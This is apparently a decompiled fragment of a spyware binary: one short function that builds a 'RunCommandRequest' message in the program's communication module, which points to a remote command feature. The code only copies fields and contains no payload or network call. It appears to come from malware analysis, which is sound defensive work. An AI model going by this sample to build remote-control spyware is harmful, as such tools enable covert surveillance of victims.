
  fn spyware::communication::messages::Message::RunCommandRequest::h075183aa725d84a0(arg1: *mut i64, arg2: *mut i128) -> i512

{
    let result: i128 = *arg2;
    *arg1.byte_offset(0x18) = arg2[1];
    *arg1.byte_offset(8) = result;
    *arg1 = -0x8000000000000000;
    result
}
